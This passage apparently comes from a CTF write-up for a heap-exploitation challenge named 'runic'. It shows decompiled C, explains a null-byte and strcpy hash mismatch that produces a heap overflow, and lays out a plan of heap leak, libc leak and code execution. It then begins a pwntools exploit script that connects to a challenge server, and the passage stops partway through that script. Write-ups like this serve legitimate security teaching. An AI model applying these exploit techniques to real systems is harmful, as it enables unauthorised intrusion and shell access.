+<p><strong>show</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">show</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buf</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Rune name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">MainTable</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)]</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Rune contents:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v0</span> <span class="o">=</span> <span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">MainTable</span><span class="p">[</span><span class="n">v0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">)</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;That rune doesn&#39;t exist!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This function is used to see the rune contents. It also prevent UAF because it checks whether the rune is still active or not. Let&rsquo;s move to the next function.</p>
+<p><strong>edit</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="nf">edit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// eax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-30h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-28h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">src</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-20h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buf</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">src</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Rune name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">dest</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)(</span><span class="n">MainTable</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)]</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">dest</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;New name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">MainTable</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">src</span><span class="p">)]</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;That rune name is already in use!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v0</span> <span class="o">=</span> <span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">src</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">strcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">MainTable</span><span class="p">[</span><span class="n">v0</span><span class="p">],</span> <span class="n">src</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">MainTable</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)]</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v2</span> <span class="o">=</span> <span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">src</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">MainTable</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">),</span> <span class="n">v1</span><span class="p">,</span> <span class="mh">0xCuLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">strcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v3</span> <span class="o">=</span> <span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">MainTable</span><span class="p">[</span><span class="n">v3</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x14uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Rune contents: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v4</span> <span class="o">=</span> <span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">dest</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">dest</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">MainTable</span><span class="p">[</span><span class="n">v4</span><span class="p">]</span> <span class="o">+</span> <span class="mi">16LL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;There&#39;s no rune with that name!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v9</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is the edit function. To summarize, it will:</p>
+<ul>
+<li>Aks for the <code>old_rune_name</code></li>
+<li>Calculate the hash
+<ul>
+<li>If exist:
+<ul>
+<li>Ask for the <code>new_rune_name</code>.</li>
+<li>Validate the <code>new_rune_name</code> to prevent hash collision.</li>
+<li>Copy the <code>new_rune_name</code> to <code>items</code> value pointed by <code>MainTable[hash(old_rune_name)]</code>.</li>
+<li>Copy the <code>items</code> value pointed by <code>MainTable[hash(old_rune_name)]</code> to <code>MainTable[hash(new_rune_name)]</code>.</li>
+<li>Nullify the <code>items</code> pointed by <code>MainTable[hash(old_rune_name)]</code>.</li>
+<li>Store the <code>new_rune_contents</code> to the</li>
+</ul>
+</li>
+<li>If not exist:
+<ul>
+<li>It will return error</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>Notice that there is a small bug in the <code>edit</code> function. Take a look at this LOCs:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">puts</span><span class="p">(</span><span class="s">&#34;New name: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">MainTable</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)]</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">v2</span> <span class="o">=</span> <span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">src</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">MainTable</span><span class="p">[</span><span class="n">v2</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8LL</span><span class="p">),</span> <span class="n">v1</span><span class="p">,</span> <span class="mh">0xCuLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="nf">strcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Rune contents: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">v4</span> <span class="o">=</span> <span class="nf">hash</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">dest</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">dest</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="n">MainTable</span><span class="p">[</span><span class="n">v4</span><span class="p">]</span> <span class="o">+</span> <span class="mi">16LL</span><span class="p">));</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>src</code> is the string of the <code>new_rune_name</code>. During moving the entry of old rune name items to the new rune name items, it uses the <code>hash(src)</code>.</p>
+<p>However, during filling the <code>rune_contents</code>, it doesn&rsquo;t directly use <code>hash(src)</code> during fetching the read size. It uses variable called <code>dest</code>, which is a string copied from <code>src</code> via <code>strcpy</code>.</p>
+<p><code>strcpy</code> will only copy a string until its first null byte. Yet, it uses <code>read(0, src, 0x8)</code> during filling the <code>src</code> variable, which allowed us to send null byte in the middle of its <code>rune_name</code>. That means, during the binary asks for the <code>rune_contents</code>, the read size (which is <code>MainTable[hash(dest)] + 16LL</code>) can be wrong, because the value of <code>dest</code> and <code>src</code> is different if there is a null-byte in the middle of the rune name.</p>
+<p>For example, let say the <code>src</code> value is <code>\x01\x00\x02</code>. The result of <code>hash(src)</code> is <code>3</code>. But, the result of <code>hash(dest)</code> is <code>1</code>, because <code>strcpy(dest, src)</code> will set the <code>dest</code> value to <code>\x01\x00</code>. This means, the <code>size</code> that is used during <code>read(0, dest + 8, *(unsigned int *)(MainTable[v4] + 16LL));</code> will used the <code>size</code> of <code>MainTable[1]</code> instead of <code>MainTable[3]</code>.</p>
+<p>Now that we&rsquo;ve found the bug, let&rsquo;s start to think on how to leverage this bug to gain a shell.</p>
 <h3 id="solution-6">Solution</h3>
+<p>We can use the bug to trigger a heap overflow bug, by setting the size larger than the actual chunk&rsquo;s size. For example, we create a rune where the <code>rune_name_a = '\x01\x00'</code>, so that <code>hash(rune_name_a)</code> value is <code>1</code>, and set its size to <code>0x60</code>. Then, we create another rune where the <code>rune_name_b = '\x02\x00'</code>, so that the <code>hash(rune_name_b)</code> value is <code>2</code>, and set its size <code>0x10</code>. If we use the <code>edit</code> menu to edit the <code>rune_name_b</code> to <code>rune_name_c = '\x01\x00\x02</code>, then during fetching the new contents <code>size</code>, it will use the <code>rune_a</code> size because the <code>hash(dest)</code> of <code>rune_name_c</code> will be <code>1</code> instead of <code>3</code>.</p>
+<p>Let&rsquo;s try to think first on how we will use the heap overflow bug. Supposed that we already have an overflow, what should we do to get a leak of heap base?</p>
+<p>The answer is we need to have two adjacent chunks, where the first chunk is the one that we can overflow, and the second chunk is a freed chunk that contains a <code>mangled</code> pointer to the heap area. Let say that we have this chunks:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x0000000000000000	0x0000000000000021
+</span></span><span class="line"><span class="cl">0x0000000000000000	0x0000000000000000 &lt;- chunk_a (Active)
+</span></span><span class="line"><span class="cl">0x0000000000000000	0x0000000000000021
+</span></span><span class="line"><span class="cl">0x0000000000424242	0x0000000000000000 &lt;- chunk_b (Inactive (has been freed))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And we want to leak the <code>chunk_b</code>. What we can do is simply overflow the <code>chunk_a</code> until it reach the <code>chunk_b b</code> data, and then with the <code>show</code> menu, we can call <code>puts(chunk_a)</code>, which due to the overflow, it will also print the <code>chunk_b</code> value even though <code>chunk_b</code> is a free chunk and originally can&rsquo;t be seen with the <code>show</code> menu.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x0000000000000000	0x0000000000000021
+</span></span><span class="line"><span class="cl">0x6161616161616161	0x6161616161616161 &lt;- Overflow chunk_a (Active)
+</span></span><span class="line"><span class="cl">0x6161616161616161	0x6161616161616161
+</span></span><span class="line"><span class="cl">0x0000000000424242	0x0000000000000000 &lt;- chunk_b (Inactive (has been freed))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">If we call puts(chunk_a), the content of chunk_b will be printed as well
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is the basic logic that we will use during leveraging the overflow bug. Not only leaking adjacent chunk values, we can also modify adjacent chunk <code>size</code> metadata, or even poisoned its <code>tcache</code> freelist pointer (if the <code>chunk</code> is a <code>tcache</code> entry). With the overflow bug, it&rsquo;s enough for us to gain a shell. My main idea to trigger the shell is:</p>
+<ul>
+<li>Leak a heap address</li>
+<li>Leak a libc base</li>
+<li>Gain Remote Code Execution</li>
+</ul>
+<h4 id="leak-heap-address">Leak heap address</h4>
+<p>Let&rsquo;s start by defining helpers first:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;runic_patched&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s2">&#34;165.232.98.11&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">30688</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># gdb.attach(r, gdbscript=gdbscript)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_url</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">demangle</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">is_heap_base</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_heap_base</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xfff</span> <span class="o">&lt;&lt;</span> <span class="mi">52</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">mask</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">v</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="n">mask</span>
+</span></span><span class="line"><span class="cl">            <span class="n">val</span> <span class="o">^=</span> <span class="p">(</span><span class="n">v</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">mask</span> <span class="o">&gt;&gt;=</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">val</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl">
